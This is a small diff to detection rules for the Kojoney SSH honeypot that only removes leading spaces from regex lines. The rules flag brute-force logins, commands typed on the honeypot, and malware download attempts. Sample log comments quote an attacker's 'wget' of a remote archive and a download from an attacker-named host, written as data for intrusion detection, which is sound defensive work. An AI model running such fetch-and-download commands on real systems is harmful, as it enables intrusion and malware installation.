@@ -30,7 +30,7 @@
 
 
 #LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root trying auth password
- regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) trying auth password; \
+regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) trying auth password; \
  classification.text=SSH Brute Force Login Attempt; \
  id=20000; \
  revision=1; \
@@ -47,7 +47,7 @@
  last;
 
 #LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root authenticated with password
- regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) authenticated with password; \
+regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) authenticated with password; \
  classification.text=SSH Login; \
  id=20001; \
  revision=2; \
@@ -65,7 +65,7 @@
  last;
 
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] COMMAND IS : wget http://www.test.de/bla.zip // executing command "id"
- regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] (executing .*|COMMAND .*); \
+regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] (executing .*|COMMAND .*); \
  classification.text=SSH commands given on Honeypot command line; \
  id=20002; \
  revision=1; \
@@ -83,7 +83,7 @@
  last;
 
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Saved the file /var/log/kojoney/http___attacker_100free_com_all_tar212 requested by the attacker.
- regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Saved the file (.*) requested by the attacker; \
+regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Saved the file (.*) requested by the attacker; \
  classification.text=Malware download attempt; \
  id=20003; \
  revision=1; \
@@ -101,7 +101,7 @@
  last;
 
 #LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Error downloading file http://attacker_100free_com_all_tar212 request by attacker.
- regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Error downloading file (.*) request by attacker; \
+regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Error downloading file (.*) request by attacker; \
  classification.text=Malware download attempt; \
  id=20004; \
  revision=1; \
